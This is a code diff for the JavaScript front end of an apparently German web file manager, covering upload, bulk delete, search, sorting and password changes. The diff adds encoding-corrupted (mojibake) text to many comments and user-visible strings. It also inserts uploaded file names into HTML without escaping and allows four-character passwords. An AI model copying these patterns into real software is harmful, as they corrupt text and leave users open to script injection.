+// Ã¢â€â‚¬Ã¢â€â‚¬ Pin Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 async function pinFile(btn, relPath) {
   const row = btn.closest('tr');
   const fd = new FormData(); fd.append('_t', _token); fd.append('f', relPath);
@@ -959,12 +1067,12 @@ async function pinFile(btn, relPath) {
   } catch {}
 }
 
-// â”€â”€ Download â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Download Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 function dlFile(relPath) {
   window.location.href = '?dl=1&f=' + encodeURIComponent(relPath) + '&_t=' + encodeURIComponent(_token);
 }
 
-// â”€â”€ Note â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Note Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 let _noteOrig = '';
 function startNote() {
   const el = document.getElementById('noteTxt');
@@ -998,21 +1106,27 @@ async function saveNote() {
   } catch { showToast('Fehler beim Speichern', 'bi-x', 2500); }
 }
 
+// Ã¢â€â‚¬Ã¢â€â‚¬ Upload Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 // â”€â”€ Upload â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+function toggleUpload() {
+  const body = document.getElementById('upBody');
+  const chev = document.getElementById('upChev');
+  const open = body.classList.toggle('open');
+  chev.style.transform = open ? 'rotate(180deg)' : '';
+}
 const upDrop = document.getElementById('upDrop');
 const upInp  = document.getElementById('upInp');
 if (upDrop) {
-  upDrop.addEventListener('click', () => upInp.click());
+  upDrop.addEventListener('click', e => { if (!e.target.closest('label')) upInp.click(); });
   upDrop.addEventListener('dragover', e => { e.preventDefault(); upDrop.classList.add('drag'); });
   upDrop.addEventListener('dragleave', () => upDrop.classList.remove('drag'));
   upDrop.addEventListener('drop', e => { e.preventDefault(); upDrop.classList.remove('drag'); uploadFiles(e.dataTransfer.files); });
-  upInp.addEventListener('change', () => uploadFiles(upInp.files));
+  upInp.addEventListener('change', () => { uploadFiles(upInp.files); upInp.value = ''; });
 }
 async function uploadFiles(fileList) {
   if (!fileList || !fileList.length) return;
   const fd = new FormData();
-  fd.append('_t', _token);
-  fd.append('d', '');
+  fd.append('_t', _token); fd.append('d', '');
   for (const f of fileList) fd.append('f[]', f);
   showToast('Wird hochgeladen ...', 'bi-cloud-upload', 99999);
   try {
@@ -1022,15 +1136,86 @@ async function uploadFiles(fileList) {
     if (!data.ok && data.s === 'auth') { showToast('Keine Berechtigung', 'bi-lock', 3000); return; }
     const st = document.getElementById('upStatus');
     st.innerHTML = (data.files||[]).map(f =>
-      `<div class="up-item ${f.ok?'ok':'err'}"><i class="bi ${f.ok?'bi-check2':'bi-x'}"></i>${f.n}${f.s==='type'?' (Dateityp nicht erlaubt)':''}</div>`
+      `<div class="up-item ${f.ok?'ok':'err'}"><i class="bi ${f.ok?'bi-check2':'bi-x'}"></i>${f.n}${f.s==='type'?' (Typ nicht erlaubt)':''}</div>`
     ).join('');
     const ok = (data.files||[]).filter(f=>f.ok).length;
-    showToast(ok + ' Datei(en) hochgeladen', 'bi-check-circle', 3000);
-    if (ok > 0) setTimeout(() => location.reload(), 2500);
+    showToast(ok + ' Datei(en) hochgeladen â€” wird neu geladen ...', 'bi-check-circle', 2500);
+    if (ok > 0) setTimeout(() => location.reload(), 2000);
   } catch { hideToast(); showToast('Upload-Fehler', 'bi-wifi-off', 3000); }
 }
 
-// â”€â”€ Search â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â”€â”€ Checkboxes & Bulk Delete â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+function updateBulk() {
+  const checked = [...document.querySelectorAll('.row-cb:checked')];
+  const bar = document.getElementById('bulkBar');
+  const cnt = document.getElementById('bulkCnt');
+  cnt.textContent = checked.length + ' ausgewÃ¤hlt';
+  bar.classList.toggle('show', checked.length > 0);
+  const all = document.getElementById('cbAll');
+  if (all) {
+    const total = document.querySelectorAll('.row-cb').length;
+    all.indeterminate = checked.length > 0 && checked.length < total;
+    all.checked = checked.length === total && total > 0;
+  }
+}
+function clearSel() {
+  document.querySelectorAll('.row-cb,.fchk[id=cbAll]').forEach(cb => { cb.checked = false; cb.indeterminate = false; });
+  document.getElementById('bulkBar').classList.remove('show');
+}
+document.getElementById('cbAll')?.addEventListener('change', function() {
+  document.querySelectorAll('.row-cb').forEach(cb => cb.checked = this.checked);
+  updateBulk();
+});
+
+let _delPaths = [];
+function confirmDelete() {
+  _delPaths = [...document.querySelectorAll('.row-cb:checked')].map(cb => cb.value);
+  if (!_delPaths.length) return;
+  const multi = _delPaths.length > 1;
+  document.getElementById('delTtl').textContent = multi
+    ? _delPaths.length + ' Dateien wirklich lÃ¶schen?'
+    : '"' + _delPaths[0].split('/').pop() + '" wirklich lÃ¶schen?';
+  document.getElementById('delInfo').textContent = multi
+    ? 'Passwort erforderlich fÃ¼r Mehrfach-LÃ¶schung.' : '';
+  const pwInp = document.getElementById('delPw');
+  pwInp.style.display = multi ? '' : 'none';
+  pwInp.value = '';
+  document.getElementById('delErr').textContent = '';
+  document.getElementById('delOv').classList.add('open');
+  setTimeout(() => (multi ? pwInp : document.getElementById('delConfBtn')).focus(), 50);
+}
+function closeDelOv() {
+  document.getElementById('delOv').classList.remove('open');
+  document.getElementById('delPw').value = '';
+  document.getElementById('delErr').textContent = '';
+}
+async function execDelete() {
+  const multi = _delPaths.length > 1;
+  const pw    = document.getElementById('delPw').value;
+  if (multi && !pw) { document.getElementById('delErr').textContent = 'Passwort eingeben'; return; }
+  const fd = new FormData();
+  fd.append('_t', _token);
+  fd.append('f', JSON.stringify(_delPaths));
+  if (multi) fd.append('pw', pw);
+  try {
+    const res  = await fetch('?_del=1', {method:'POST', body:fd});
+    const data = await res.json();
+    if (!data.ok) {
+      document.getElementById('delErr').textContent =
+        data.s === 'pw' ? 'Falsches Passwort' : 'Fehler: ' + (data.s||'unbekannt');
+      return;
+    }
+    closeDelOv();
+    clearSel();
+    data.deleted.forEach(rel => {
+      document.querySelector(`tr[data-path="${rel}"]`)?.remove();
+    });
+    showToast(data.deleted.length + ' Datei(en) gelÃ¶scht', 'bi-trash3', 2500);
+  } catch { document.getElementById('delErr').textContent = 'Verbindungsfehler'; }
+}
+document.getElementById('delPw')?.addEventListener('keydown', e => { if (e.key==='Enter') execDelete(); });
+
+// Ã¢â€â‚¬Ã¢â€â‚¬ Search Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 document.getElementById('searchInp')?.addEventListener('input', function() {
   const q = this.value.toLowerCase().trim();
   let visible = 0;
@@ -1045,7 +1230,7 @@ document.getElementById('searchInp')?.addEventListener('input', function() {
   if (nr) nr.style.display = visible === 0 && q ? 'block' : 'none';
 });
 
-// â”€â”€ Sort â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Sort Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 let _sortKey = 'pin', _sortDir = 1;
 function setSort(key) {
   if (_sortKey === key) _sortDir *= -1; else { _sortKey = key; _sortDir = 1; }
@@ -1071,7 +1256,7 @@ function setSort(key) {
   rows.forEach(r => body.appendChild(r));
 }
 
-// â”€â”€ Source Viewer â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Source Viewer Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 async function showSrc(relPath, filename) {
   document.getElementById('cdFile').textContent = filename;
   const el = document.getElementById('cdEl');
@@ -1099,9 +1284,9 @@ async function copyCode() {
   setTimeout(() => { btn.innerHTML = '<i class="bi bi-clipboard"></i> Kopieren'; btn.style.cssText = ''; }, 2000);
 }
 
-// â”€â”€ Version click = manual update (admin only) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Version click = manual update (admin only) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 document.querySelector('.ver').addEventListener('click', async () => {
-  if (userLevel < 2) { showToast('Admin-Modus benÃ¶tigt (Konsole: admin)', 'bi-lock', 2500); return; }
+  if (userLevel < 2) { showToast('Admin-Modus benÃƒÂ¶tigt (Konsole: admin)', 'bi-lock', 2500); return; }
   showToast('Suche Update ...', 'bi-cloud-download', 99999);
   const fd = new FormData(); fd.append('_t', _token);
   try {
@@ -1119,11 +1304,11 @@ document.querySelector('.ver').addEventListener('click', async () => {
   } catch { hideToast(); showToast('Verbindungsfehler', 'bi-wifi-off', 3000); }
 });
 
-// â”€â”€ Change Password â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Ã¢â€â‚¬Ã¢â€â‚¬ Change Password Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
 function openCpw(forced) {
   const ttl = document.getElementById('cpwTtl');
-  ttl.textContent = forced === false ? 'Passwort Ã¤ndern'
-    : 'Standard-Passwort Ã¤ndern â€” bitte jetzt setzen';
+  ttl.textContent = forced === false ? 'Passwort ÃƒÂ¤ndern'
+    : 'Standard-Passwort ÃƒÂ¤ndern Ã¢â‚¬â€ bitte jetzt setzen';
   document.getElementById('cpwSkip').style.display = forced === false ? '' : 'none';
   document.getElementById('cpwOv').classList.add('open');
   setTimeout(() => document.getElementById('cpwCur').focus(), 50);
@@ -1140,7 +1325,7 @@ document.getElementById('cpwBtn').addEventListener('click', async () => {
   const err = document.getElementById('cpwErr');
   err.textContent = '';
   if (nw.length < 4) { err.textContent = 'Mind. 4 Zeichen'; return; }
-  if (nw !== con)    { err.textContent = 'PasswÃ¶rter stimmen nicht Ã¼berein'; return; }
+  if (nw !== con)    { err.textContent = 'PasswÃƒÂ¶rter stimmen nicht ÃƒÂ¼berein'; return; }
   const fd = new FormData();
   fd.append('_t', _token); fd.append('cur', cur); fd.append('new', nw);
   try {
@@ -1148,7 +1333,7 @@ document.getElementById('cpwBtn').addEventListener('click', async () => {
     const data = await res.json();
     if (data.ok) {
       closeCpw();
-      showToast('Passwort geÃ¤ndert', 'bi-check2-circle', 3000);
+      showToast('Passwort geÃƒÂ¤ndert', 'bi-check2-circle', 3000);
     } else {
       err.textContent = data.s === 'wrong' ? 'Aktuelles Passwort falsch'
         : data.s === 'short' ? 'Zu kurz' : 'Fehler';
